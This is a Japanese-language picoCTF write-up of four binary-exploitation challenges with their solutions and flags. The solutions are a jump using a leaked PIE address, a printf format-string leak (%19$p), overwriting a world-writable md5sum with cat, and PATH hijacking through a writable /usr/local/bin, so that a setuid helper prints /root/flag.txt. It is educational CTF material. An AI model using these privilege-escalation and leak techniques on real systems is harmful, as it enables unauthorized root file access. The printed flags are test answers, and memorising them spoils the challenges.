## [Binary Exploitation]: PIE TIME (75 points)
- - -
### Challenge
> Can you try to get the flag? Beware we have PIE!
Additional details will be available after launching your challenge instance.
<br /><br />
Hint: Can you figure out what changed between the address you found locally and in the server output?

Attachment:

- vuln (ELF 64-bit)
- vuln.c

<br />

### Solution

まずは、実行して動きをみてみます。

<pre>
$ nc rescued-float.picoctf.net 55539
Address of main: 0x5c34e296d33d
Enter the address to jump to, ex => 0x12345:

</pre>

<br />

main()関数のアドレスが表示され、その後、任意のアドレスを入れると、そこに飛んでくれるようになっています。

<br />

ソースコードを見ると、win()関数が用意されていて、gdbを使ってmain()関数とwin()関数とのアドレスの差分を見ると -0x96 でした。

<br /><br />

ということで、

<pre>
$ nc rescued-float.picoctf.net 55539
Address of main: 0x5c34e296d33d
Enter the address to jump to, ex => 0x12345: 0x5c34e296d2a7
Your input: 5c34e296d2a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_31cc212b}
</pre>


<br />

Flag: `picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_31cc212b}`


<br /><br />
<br /><br />
## [Binary Exploitation]: PIE TIME 2 (200 points)
- - -
### Challenge
> Can you try to get the flag? I'm not revealing anything anymore!!
<br /><br />
Hint1: What vulnerability can be exploited to leak the address?
<br />
Hint2: Please be mindful of the size of pointers in this binary

- vuln (ELF 64-bit)
- vuln.c

以下が中身

{{< highlight c "linenos=table,hl_lines=15" >}}
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}
{{< / highlight >}}

<br />

### Solution

上記ソースコードのハイライトしているところで、書式文字列攻撃ができます。

<br />

gdbで解きました。

M1 Mac上で動かしている VMWare の Ubuntu では結果が異なってしまって解けなかったので、別のPCを使いました。

<br />

gdbでwin()関数のアドレスを確認しつつ、%14$p から順番に、%15$p、%16$p、と試していったら、%19$p を入れたときにwin()関数のアドレスと近い値を発見できました。

かつ、アドレスの差分が常に固定 (0xd7) であったため、これを使いました。

<pre>
$ nc rescued-float.picoctf.net 50119
Enter your name:%19$p
0x55ef63fcd441
 enter the address to jump to, ex => 0x12345: 0x55ef63fcd36a
You won!
picoCTF{p13_5h0u1dn'7_134k_e7fc8501}
</pre>

<br />

Flag: `picoCTF{p13_5h0u1dn'7_134k_e7fc8501}`



<br /><br />
<br /><br />
## [Binary Exploitation]: hash-only-1 (100 points)
- - -
### Challenge
> Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!<br />
Connect using ssh ctf-player@shape-facility.picoctf.net -p 62974 with the password, a15d25e1 and run the binary named "flaghasher".<br />
You can get a copy of the binary if you wish: scp -P 62974 ctf-player@shape-facility.picoctf.net:~/flaghasher .

<br />

### Solution

まずはSSHをして、動きを見てみます。ホームディレクトリに flaghasher というバイナリファイルがあり、実行すると /root/flag.txt の md5値を出してくれます。

<pre>
ctf-player@pico-chall$ ls -al
total 24
drwxr-xr-x 1 ctf-player ctf-player    20 Mar 13 08:10 .
drwxr-xr-x 1 root       root          24 Mar  6 03:44 ..
drwx------ 2 ctf-player ctf-player    34 Mar 13 08:10 .cache
-rw-r--r-- 1 root       root          67 Mar  6 03:45 .profile
-rwsr-xr-x 1 root       root       18312 Mar  6 03:45 flaghasher

ctf-player@pico-chall$ ./flaghasher
Computing the MD5 hash of /root/flag.txt....
</pre>


<br /><br />

md5sumのパーミッションを見たら、上書きが可能でした。

<pre>
ctf-player@pico-chall$ ls -al /usr/bin/md5sum
-rwxrwxrwx 1 root root 47480 Sep  5  2019 /usr/bin/md5sum
</pre>


<br /><br />

ということで、cat コマンドを md5sum コマンドとして上書きしちゃいます。

<pre>
ctf-player@pico-chall$ cp /usr/bin/cat /usr/bin/md5sum

ctf-player@pico-chall$ ./flaghasher
Computing the MD5 hash of /root/flag.txt....

picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_cc661106}
</pre>

<br />

Flag: `picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_cc661106}`




<br /><br />
<br /><br />
## [Binary Exploitation]: hash-only-2 (200 points)
- - -
### Challenge
> Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content! <br />
Connect using ssh ctf-player@rescued-float.picoctf.net -p 53489 with the password, 83dcefb7 and run the binary named "flaghasher".

<br />

### Solution

今回は、md5sumのパーミッションは上書きできないようになっています。

<pre>
ctf-player@pico-chall$ ls -al /usr/bin/md5sum
-rwxr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/md5sum
</pre>

<br /><br />

`$PATH` は以下のようになっており、/usr/bin/ より先に参照されるディレクトリがいくつかあります。

<pre>
ctf-player@pico-chall$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
</pre>

<br /><br />

ひとつひとつ見ていくと、/usr/local/bin/ のパーミッションがおかしなことに書き込み可能になっています。

<pre>
ctf-player@pico-chall$ ls -al /usr/local/
total 0
drwxr-xr-x 1 root root 17 Oct  6  2021 .
drwxr-xr-x 1 root root 19 Oct  6  2021 ..
drwxrwxrwx 1 root root 24 Mar  6 19:42 bin
</pre>

<br /><br />

ということで、/usr/local/bin/md5sum として実行ファイルを置けば、/usr/bin/md5sum の代わりに実行されます。

<br />

md5sum というスクリプトファイルを作りたかったんですが、以下のようなやり方はできなかったので、

<pre>
ctf-player@pico-chall$ echo "cat /root/flag.txt" >> /usr/local/bin/md5sum
-rbash: /usr/local/bin/md5sum: restricted: cannot redirect output
</pre>

<pre>
ctf-player@pico-chall$ cd /usr/local/bin/
-rbash: cd: restricted
</pre>

<pre>
ctf-player@pico-chall$ cat << EOS > md5sum
> #!/bin/bash
> cat /root/flag.txt
> EOS
-rbash: md5sum: restricted: cannot redirect output
</pre>

<pre>
$ scp -P 56250 md5sum ctf-player@rescued-float.picoctf.net:~/
ctf-player@rescued-float.picoctf.net's password:
scp: Connection closed
</pre>

<br /><br />

ヒアドキュメント ＋ tee コマンドでファイルを作ることにしました。

以下を参考にさせてもらいました。

https://te2u.hatenablog.jp/entry/2015/07/01/224505

<br />

<pre>
ctf-player@pico-chall$ cat <<'EOT' | tee /usr/local/bin/md5sum
> #!/bin/bash
> cat /root/flag.txt
> EOT


ctf-player@pico-chall$ ls -al /usr/local/bin/
total 24
drwxrwxrwx 1 root       root          20 Mar 16 09:55 .
drwxr-xr-x 1 root       root          17 Oct  6  2021 ..
-rwsr-xr-x 1 root       root       18312 Mar  6 19:42 flaghasher
-rw-rw-r-- 1 ctf-player ctf-player    31 Mar 16 09:55 md5sum


ctf-player@pico-chall$ chmod 755 /usr/local/bin/md5sum

ctf-player@pico-chall$ flaghasher
Computing the MD5 hash of /root/flag.txt....

picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_5547c7aa}
</pre>

<br />

Flag: `picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_5547c7aa}`


<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />

